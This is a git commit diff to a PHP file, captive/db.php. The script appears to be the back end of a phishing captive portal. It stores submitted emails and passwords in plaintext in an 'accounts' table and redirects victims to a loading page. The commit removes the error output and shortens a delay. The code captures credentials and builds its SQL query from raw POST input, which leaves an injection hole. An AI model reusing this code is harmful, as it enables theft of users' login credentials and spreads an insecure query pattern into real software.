a4cb2527e468d59964da180c338625d5ef5b9c0f
hacefresko <victorfrespe@gmail.com>
2020-12-13 13:24:13 -0800

    Reduced content of db.php

--- captive/db.php
+++ captive/db.php
@@ -11,15 +11,11 @@ $conn = mysqli_connect($host, $username, $pass, $dbname);// Check connection
 if ($conn) {
     $email=$_POST['email'];
     $password=$_POST['password'];
-	$sql = "INSERT INTO accounts (email, password) VALUES ('$email', '$password')";
-	if (mysqli_query($conn, $sql)) {
-        	echo "New record created successfully";
-	} else {
-    		echo "Error: " . $sql . "<br>" . mysqli_error($conn);
-	}
-	mysqli_close($conn);
+    $sql = "INSERT INTO accounts (email, password) VALUES ('$email', '$password')";
+    mysqli_query($conn, $sql);
+    mysqli_close($conn);
 }
-sleep(2);
+sleep(1);
 header("location:loading.html");
 ob_end_flush();
 ?>
